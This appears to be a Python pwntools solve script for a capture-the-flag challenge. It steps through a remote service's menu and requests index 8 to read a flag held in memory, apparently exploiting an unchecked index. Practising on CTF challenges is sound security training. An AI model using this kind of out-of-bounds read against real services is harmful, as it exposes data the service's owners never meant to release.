from pwn import *

# Connect to the remote server
p = remote('play.scriptsorcerers.xyz', 10250)

# --- Step 1: Load the flag into memory ---
log.info("Step 1: Sending '1337' to load the flag into memory...")

# WAIT for the menu to be printed before sending anything.
# '4. Exit\n' is a reliable marker that the menu has finished printing.
p.recvuntil(b'4. Exit\n') 
p.sendline(b'1337')

# --- Step 2: Choose the 'Read data' option ---
log.info("Step 2: Sending '2' to select the 'Read data' option...")

# WAIT for the next menu prompt.
p.recvuntil(b'4. Exit\n')
p.sendline(b'2')

# --- Step 3: Send the index to read the flag ---
log.info("Step 3: Sending index '8' to read the flag...")

# WAIT for the "Index: " prompt.
p.recvuntil(b'Index: ')
p.sendline(b'8')

# --- Step 4: Receive and print the flag ---
log.info("--- Program Output ---")
p.recvuntil(b'Data: ')
flag = p.recvline()
log.success(f"Flag: {flag.decode()}")

p.close()